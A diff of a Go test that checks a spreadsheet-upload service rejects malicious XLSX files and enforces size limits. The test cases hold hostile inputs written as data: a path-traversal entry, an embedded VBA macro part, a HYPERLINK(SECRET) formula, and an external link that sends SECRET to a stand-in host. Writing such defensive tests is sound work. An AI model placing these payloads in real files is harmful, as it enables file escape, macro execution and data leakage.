@@ -80,9 +80,13 @@ func TestPhase11(t *testing.T) {
 		pair := []engineering.UploadColumn{{Name: "id", Type: "integer"}, {Name: "note", Type: "text", Nullable: true}}
 		for name, edit := range map[string]func(map[string]string){
 			"traversal": func(parts map[string]string) { parts["../escape.xml"] = "do not extract" },
-			"macro": func(parts map[string]string) { parts["xl/vbaProject.bin"] = "executable" },
-			"formula": func(parts map[string]string) { parts["xl/worksheets/sheet1.xml"] = strings.Replace(parts["xl/worksheets/sheet1.xml"], "<v>9007199254740993</v>", "<f>HYPERLINK(SECRET)</f><v>1</v>", 1) },
-			"external": func(parts map[string]string) { parts["xl/_rels/workbook.xml.rels"] = strings.Replace(parts["xl/_rels/workbook.xml.rels"], `Target="worksheets/sheet1.xml"`, `Target="https://invalid.example/SECRET" TargetMode="External"`, 1) },
+			"macro":     func(parts map[string]string) { parts["xl/vbaProject.bin"] = "executable" },
+			"formula": func(parts map[string]string) {
+				parts["xl/worksheets/sheet1.xml"] = strings.Replace(parts["xl/worksheets/sheet1.xml"], "<v>9007199254740993</v>", "<f>HYPERLINK(SECRET)</f><v>1</v>", 1)
+			},
+			"external": func(parts map[string]string) {
+				parts["xl/_rels/workbook.xml.rels"] = strings.Replace(parts["xl/_rels/workbook.xml.rels"], `Target="worksheets/sheet1.xml"`, `Target="https://invalid.example/SECRET" TargetMode="External"`, 1)
+			},
 		} {
 			raw := engineeringXLSX(t, edit)
 			spec := engineeringSpec(name, "xlsx", raw, pair)
@@ -91,8 +95,8 @@ func TestPhase11(t *testing.T) {
 			}
 		}
 		for name, change := range map[string]func(*config.Uploads){
-			"rows": func(l *config.Uploads) { l.MaxRows = 1 },
-			"cells": func(l *config.Uploads) { l.MaxCells = 1 },
+			"rows":       func(l *config.Uploads) { l.MaxRows = 1 },
+			"cells":      func(l *config.Uploads) { l.MaxCells = 1 },
 			"cell-bytes": func(l *config.Uploads) { l.MaxCellBytes = 1 },
 		} {
 			raw := []byte("id\n12\n13\n")
@@ -301,7 +305,7 @@ func TestPhase11(t *testing.T) {
 			t.Fatal(err)
 		}
 		refused, err := f.service.EraseUpload(ctx, f.e, "replacement", "replacement-erase", false)
-		if err != nil || refused.Upload.State == "erased" || refused.Code != "ownership_unproven" {
+		if err != nil || refused.Upload.State == "erased" || refused.Code != "workspace_ownership_unproven" {
 			t.Fatal("unproven object was erased", err, refused)
 		}
 		var value int
